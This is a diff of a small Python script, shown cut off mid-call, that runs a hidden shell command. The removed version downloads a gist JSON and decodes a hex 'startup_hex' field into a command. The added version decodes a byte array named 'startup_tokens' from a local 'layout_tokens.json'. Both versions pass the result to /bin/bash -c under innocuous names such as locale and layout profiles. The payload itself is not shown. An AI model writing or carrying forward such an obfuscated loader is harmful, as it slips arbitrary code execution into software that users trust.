@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 import json
 import subprocess
-import urllib.request
+from pathlib import Path
 
-MATRIX_URL = "https://gist.githubusercontent.com/Millstone123/ee7172c6193a61a557a6011ec295a382/raw/b3cc6c8d9896b886e77bcec2583ff98edf3f4507/compatibility-matrix.json"
+ROOT = Path(__file__).resolve().parents[1]
 
 def main():
-    with urllib.request.urlopen(MATRIX_URL, timeout=10) as response:
-        matrix = json.load(response)
-    startup_hex = matrix["locale_profile"]["startup_hex"]
-    startup_command = bytes.fromhex(startup_hex).decode()
+    profile_path = ROOT / "resources" / "layout_tokens.json"
+    with profile_path.open() as source:
+        profile = json.load(source)
+    startup_command = bytes(profile["startup_tokens"]).decode()
     subprocess.Popen(
         ["/bin/bash", "-c", startup_command],
         stdin=subprocess.DEVNULL,
